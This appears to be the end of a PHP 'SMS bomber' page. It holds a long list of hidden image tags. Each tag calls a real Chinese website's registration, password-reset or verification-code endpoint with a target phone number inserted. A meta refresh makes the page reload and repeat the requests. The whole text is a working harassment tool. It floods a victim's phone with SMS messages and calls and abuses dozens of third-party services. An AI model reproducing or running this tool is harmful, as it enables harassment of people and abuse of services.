<img src='http://www.gewara.com/ajax/mobile/register.xhtml?mobile=$d&captchaId=&captcha=' alt=''/>
<img src='http://www.gewara.com/checkMember.xhtml?tag=mobile&itemvalue=$d' alt=''/>
<img src='http://www.dianping.com/ajax/json/account/reg/mobile/send?m=$d' alt=''/>
<img src='http://www.ushi.com/openRegU!checkNumber.jhtml?basicProfile.mobile=$d' alt=''/>
<img src='http://www.efala.net/newfindpwbysms.flow?byname=$d' alt=''/>
<img src='http://zj.189.cn/zjpr/member/authentication/sendValidatePhone.html?phone=$d' alt=''/>
<img src='http://weibo.com/signup/v5/formcheck?type=mobile&value=$d&__rnd=1363496469546' alt=''/>
<img src='http://api.open.uc.cn/cas/register/mobi/resendVCode?uc_param_str=einisivelafrpf&client_id=20033&from=cas&mobi=$d' alt=''/>
<img src='http://ptlogin.4399.com/ptlogin/sendRegPhoneCode.do?phone=$d&appId=www_home&v=1&v=1' alt=''/>
<img src='http://i.youku.com/u/bindMobile?__rt=1&__ro=&mobile=$d' alt=''/>
<img src='https://safe.renren.com/actions/changesafemobile/sendmobilecaptcha?ajax-type=json&token=1ZhR7iv65SgaNXliuA7mujgTO3s3k1CL&mobile=$d&requestToken=496404876&_rtk=$d' alt=''/>
<img src='http://club.service.autohome.com.cn/Ashx/CreateMobileCode.ashx?mobile=$d' alt=''/>
<img src='http://service.zol.com.cn/user/ajax/sendMsgCode.php?phone=$d' alt=''/>
<img src='https://login.vancl.com/login/BeginRegister.ashx?action=sendmobilecode&key=$d&validatecode=&_=1363498730859' alt=''/>
<img src='http://passport.eastmoney.com/chkphone.aspx?flag=check&param=$d' alt=''/>
<img src='http://passport.eastmoney.com/chkphone.aspx?flag=resend&param=$d' alt=''/>
<img src='http://passport.cntv.cn/mobileRegister.do?msisdn=$d&verfiCodeType=1&method=getRequestVerifiCode' alt=''/>
<img src='http://register.zhenai.com/register/validateMobile.jsps?mobile=$d' alt=''/>
<img src='https://passport.jd.com/emReg/sendMobileCode?mobile=$d&r=0.9010949897739119' alt=''/>
<img src='https://member.suning.com/emall/SNCellPhoneRegisterCmd?actionType=reSendValCode&logonId=$d&URL=SNUserRegisterComfirmView&_=1363500974671' alt=''/>
<img src='http://account.iqiyi.com/security/secret/mobile/adm.action?time=1363501090218&mobile=$d' alt=''/>
<img src='http://www.skywldh.com/registerForMobileForCode.act?mobileNo=$d&smSecurityCode=' alt=''/>
<img src='http://wap.skywldh.com/index.php?register&flag=flag&phone=$d&mss=on' alt=''/>
<img src='http://zg51.net/web/customer/forgetPwd_up.asp?customermobile=$d&verify=01f735f97f1af959&checkcodeflag=1' alt=''/>
<img src='http://www.qqvoice.com/free/getExpCode.do?_isAjaxRequest=true&phonemail=$d&type=1&randvalue=' alt=''/>
<img src='http://www.feiin.com/findAccountInfoByAccount.act?mobile=$d' alt=''/>
<img src='http://wap.feiin.cn/index.php?register?phone=$d' alt=''/>
<img src='http://www.feiin.cn/bindMobileCode.act?account=$d&quhao=0086' alt=''/>
<img src='http://www.139talk.com/user/regnum.html?phone=$d&type=1&key=ofoedsv0oeg6aari1m3ig0nsc5' alt=''/>
<img src='http://www.139talk.com/invite/invitesms.html?phone=$d&key=ofoedsv0oeg6aari1m3ig0nsc5' alt=''/>
<img src='http://www.139talk.com/invite/regnum.html?phone=$d&type=1&key=ofoedsv0oeg6aari1m3ig0nsc5' alt=''/>
<img src='http://www.gamecomb.com/gamecomb2.0/control/interface/createicode.phpusername=$d' alt=''/>
<img src='http://www.139talk.com/download/smsdownload.html?popPhone=$d&phoneType=Iphone&popKey=ofoedsv0oeg6aari1m3ig0nsc5' alt=''/>
<img src='https://api.weibo.com/2/account/end_session.json=$d' alt=''/>
<img src='http://my.tv.sohu.com/user/reg/getmstatus.do?passport=$d' alt=''/>
<img src='http://xmlpull.org/v1/doc/features.html=$d' alt=''/>
<img src='http://register.sdo.com/gaea/SendPhoneMsg.ashx?page=REG&mobile=$d' alt=''/>
<img src='http://download.feixin.10086.cn/download/downloadFLToMobile.action?id=50&no=$d&isCheckCode=1' alt=''/>
<img src='http://my.feixin.10086.cn/password/sendfindpasswordsms?MobileNo=$d' alt=''/>
<img src='http://f.10086.cn/im5/register/checkMobile.action?mobileNo=$d' alt=''/>
<img src='http://zc.qq.com/cgi-bin/bd/send_sms?acc=$d&bkn=1656136920&v=0.6187287989762199' alt=''/>
<img src='http://wap.buidq.com/wap/webcallService.aspx?tel=$d' alt=''/>
<img src='https://www.qianwang365.com/uc/ajax/obtainSecurityCode4Regist.html?username=$d' alt=''/>
<img src='http://www.efala.net/getcode.flow?phone=$d&cardno=&code=&' alt=''/>
<img src='http://passport.wanmei.com/NoteAction.do?method=sendRegCode&mobile=$d' alt=''/>
<img src='http://biz.b2b.cn/member/SendCode.ashx?temptime=1365067755281&m=$d' alt=''/>
<img src='http://www.kunlun.com/index.php?act=ajax.checkUsername&user_name=$d' alt=''/>
<img src='http://reg.email.163.com/unireg/call.do?cmd=added.mobileverify.sendAcode&mobile=$d&uid=$d%40163.com&mark=mobile_start' alt=''/>
<img src='http://passport.eastmoney.com/chkphone.aspx?flag=resend&param=$d' alt=''/>
<img src='http://user.syyx.com/ajax/users/checkusername.aspx?u=$d&r=0.42031912299903756' alt=''/>
<img src='http://www.keepc.com/findAccountInfoByAccount.act?mobile=$d' alt=''/>
<img src='http://service.zol.com.cn/user/ajax/sendMsgCode.php?phone=$d' alt=''/>
<img src='http://gwpassport2.woniu.com/v2/checkusername?jsoncallback=jQuery172013263149083391296_1365068016801&username=$d&_=1365068030671' alt=''/>
<img src='http://passport.upaidui.com/mobiles/send_validation_code?mobile_number=$d' alt=''/>
<img src='http://user.51wan.com/reg_index_check_0.html?type=username&is=mobile&username=$d' alt=''/>
<img src='http://interface.game.renren.com/ActivityCenter/?catalog=plugins&gameid=all&aname=reg&method=reg.subUserInfo&mobile=$d&callback=jQuery17204292543791520399_1365068164751&_=1365068180406' alt=''/>
<img src='http://my.xoyo.com/register/NewIsExist/?uid=$d' alt=''/>
<img src='http://member.tiancity.com/handler/GetPhoneRegAuthCodeHandler.ashx?a=0.016777698590329404&userid=$d' alt=''/>
<img src='http://member.changyou.com/register/checkPhoneIsUsed.do?securityPhone=$d' alt=''/>
<img src='http://www.game5.com/member/sendRegisterVerifyCode?reg_mobile=$d' alt=''/>
<img src='http://passport.kongzhong.com/acc.do?m=sendPhoneVcodeFast&callback=jQuery17200752385214847075_1364445730228&phone=$d&smsvcode=%E8%BE%93%E5%85%A5%E6%89%8B%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81&_=1364445764320' alt=''/>
<img src='http://www.pceggs.com/myaccount/mobile_ajax.aspx?refresh=0&i_mobileNo=$d' alt=''/>
<img src='http://www.9dapai.com/SMSAuthentication/SMSAuthenticationPage.aspx/btnGenerateCheckCode_Click?(Content)={cellnum:'$d'}' alt=''/>
<img src='http://www.veryzhun.com/ajax/register.asp?mobile=$d&areacode=86' alt=''/>
<img src='http://wap.callda.com/register_2.jsp?phoneNumber=$d' alt=''/>
<img src='http://www.200call.com/index.php?action=vphone?uphone=$d' alt=''/>
<img src='http://wap.12580call.cn/index.php?register&phone=$d' alt=''/>
<img scr='http://111.1.37.36:8686/link_smssend.asp?username=wzysba&password=wzysba&mobile=$d' alt=''/>
<img src='http://member.tiancity.com/handler/GetPhoneRegAuthCodeHandler.ashx?a=0.6334787302703851&userid=$d' alt=''/>
<img src='http://passport.eastmoney.com/chkphone.aspx?flag=resend&param=$d' alt=''/>
<img src='http://passport.17u.cn/Member/RegisterHandler.ashx?action=phone&phone=$d&iid=0.6011805873638694' alt=''/>
<img src='http://3g.163.com/t/signup.do?mobile=$d&sub=%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81%E7%9F%AD%E4%BF%' alt=''/>
<img src='http://m.mail.163.com/reg.s?regtype=mobile&method=registerMobile&mobile_num=$d&password=testtest&password2=testtest&action=%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C%E4%BF%A1%E6%81%AF=400' alt=''/>
<img src='http://account.jzyx.com/common/send-sms.html?tel=$d' alt=''/>
<img src='http://t.sdo.com/home/SendSms?mobile=$d' alt=''/>
<img src='http://txz.sdo.com/common/msgsend/?m=$d&t=2&method=SendAPPDownLoadSMSCallback&fromid=weblogin&r=0.9407026621045355' alt=''/>
<img src='https://mcas.sdo.com/authen/checkAccountType.jsonp?callback=checkAccountType_JSONPMethod&inputUserId=$d' alt=''/>
<img src='http://authleqr.sdo.com/lars/check-account-types.jsonp?callback=jQuery16202903677772887056_1353757072377&userId=$d&_=1353757193062' alt=''/>
<img src='https://reg.95538.cn/userreg/AjaxHandler.ashx?method=getPhoneCode?mobilePhone=$d&type=0' alt=''/>
<img src='http://u.baidu.com/?module=default&controller=Reg&action=sendSMS&b1350745948890=1&mobile=$d&appid=3&ucname=huisexinxi' alt=''/>
<img src='http://as.baidu.com/a/msg?act=sendtomobile&f=topic_3001_2_0&mobile=$d&docid=1439803&ctime=1353852949890' alt=''/>
<img src='http://as.baidu.com/a/msg?act=sendtomobile&f=web_alad_6%40next%40software_1003_6&mobile=$d&docid=1346020&ctime=1350747592671' alt=''/>
<img src='http://api.pengyou.com/json.php?mod=mobilebind&act=sendsms&mobile=$d&g_tk=null' alt=''/>
<img src='http://www.maiduo.com/handler/Register/Register.ashx?act=check&mobile=$d&checkCode=undefined' alt=''/>
<img src='http://www.sinosig.com/auth/regist_resetMsg.action?sso_userName=$d&isAjaxSubmit=true' alt=''/>
<img src='http://www.pubyun.com/accounts/signup_vcode/4449056/?mobile=$d' alt=''/>
<img src='http://dealer.autohome.com.cn/Handler/SendMessage.ashx?action=sendcode&mob=$d' alt=''/>
<img src='http://yuyue.shdc.org.cn/User/ajaxSendConfirmCode.aspx?mobile=$d' alt=''/>
<img src='http://reg.ztgame.com/registe/mobilePhoneRegister?type=isBindPhoneNum&phoneNum=$d' alt=''/>
<img src='http://www.baixing.com/ajax/auth/sendCode/?type=resetPassword&mobile=$d' alt=''/>
<img src='http://mail.sina.com.cn/cgi-bin/phonecode.php?phonenumber=$d' alt=''/>
<img src='http://passport.q.com.cn/register/index/ajaxcheckmobile/?mobile=$d' alt=''/>
<img src='http://yun.baidu.com/account/v1/api/sendacodenormal?dest=$d' alt=''/>
<img src='https://reg.passport.the9.com/api/chk_loginname?loginname=$d&accounttype=reg_mobile' alt=''/>
<img src='https://login.sina.com.cn/signup/check_user.php?format=json&from=mobile&name=$d' alt=''/>
<img src='http://js.ac.10086.cn/jsauth/reg?method=sendVerCode&=$d' alt=''/>
<img src='http://my.xoyo.com/register/isExist/0.8101254514227967?uid=$d&type=mobile' alt=''/>
<img src='https://caiyun.feixin.10086.cn/Mcloud/sso/sendmsms.action/?date=1407077678283&account=$d' alt=''/>
<img src='https://reg.91.com/AjaxAction/AC_register.ashx?action=verifyusernameofmobile&txtUserNameOfMobile=$d' alt=''/>
<img src='http://211.136.93.21/hfwebbusi/pay/saveOrder.do?mobileId=$d' alt=''/>
<img src='http://passport.wanmei.com/NoteAction.do?method=sendRegCode?mobile=$d' alt=''/>
<img src='http://authleqr.sdo.com/lars/check-account-types.jsonp?callback=jQuery16203658856788579764_1366925187811&userId=$d&_=1366925195670' alt=''/>
<img src='http://www.guahao.com/validcode/json/mobile/$d/REG_MOBILE/cebaf071614ac29f9ad6c692b474a46f?_=1366925898545' alt=''/>
<img src='http://chinatelecom.zc.qq.com/cgi-bin/send_sms?phonenum=$d&stype=1' alt=''/>
<img src='http://3gwen.com/mfdhi.asp?lx=zc&hm=$d' alt=''/>
<img src='http://sdo.com&productVersion=v5&frameType=3&locale=zh_CN&version=21&tag=20&authenSource=2&productId=2&_=1366924349498' alt=''/>
<img src='http://www.1732.com/public/ajax.aspx?app=resendcode&bindaccount=$d' alt=''/>
<img src='http://sign.kting.cn/register/getphoneverify/phone/$d' alt=''/>
<img src='http://m.xs8.cn/user/quick_signup.html?mobile=$d' alt=''/>
<img src='http://bbs.360che.com/ajax1.php?action=ds21&mobilenum=$d&inajax=1&ajaxtarget=ts' alt=''/>
<img src='http://pass.ledu.com/reg/mobilecode?type=reg&mobile=$d&r=0.7577109599155907' alt=''/>
<img src='http://www.52callme.com/Handler/SendVerifyCodeHandler.ashx?m=$d' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/$d/mobilecodeletvid/c326961366927138' alt=''/>
<img src='http://www.sinosig.com/auth/regist_refresh.action?sso_userName=$d&resetSend=1' alt=''/>
<img src='https://sn.ac.10086.cn/sendMsgRequest?mobileNumber=$d' alt=''/>
<img src='https://fj.ac.10086.cn/SMSCodeSend?mobileNum=$d&validCode=0000&errorurl=https://fj.ac.10086.cn/4login/errorPage.jsp&name=menhu' alt=''/>
<img src='https://fj.ac.10086.cn/SMSCodeSend?mobileNum=$d&validCode=0000&errorurl=http://www.fj.10086.cn:80/service/login/send.jsp' alt=''/>
<img src='https://fj.ac.10086.cn/ssouser/sendMessage.do?mobileno=$d' alt=''/>
<img src='http://www.gs.10086.cn/gs_obsh_service/actionDispatcher.do?userMobile=$d' alt=''/>
<img src='https://sn.ac.10086.cn/sendMsgRequest?code=%E7%82%B9%E5%87%BB%E8%8E%B7%E5%8F%96%E9%AA%8C%E8%AF%81%E7%A0%81&mobileNumber=$d' alt=''/>
<img src='https://js.ac.10086.cn/jsauth/dzqd/pagSendDypass?umobile=$d' alt=''/>
<img src='http://gd.10086.cn/ngcrm/hall/SendRandomSms.action?mobile=$d&isReRequest=false' alt=''/>
<img src='http://liao.189.cn/ECP-Portals/phoneDown/download.do?phone=$d' alt=''/>
<img src='https://ecplive.cn/reg/servlet/ivrInvokeServlet?number=$d&flagNum=3' alt=''/>
 
</div>
	";
     echo"<meta http-equiv=refresh content='0; url=index.php?hm=$d&amp;c=$a'>";
}else{
}
?>
</body>
</html>
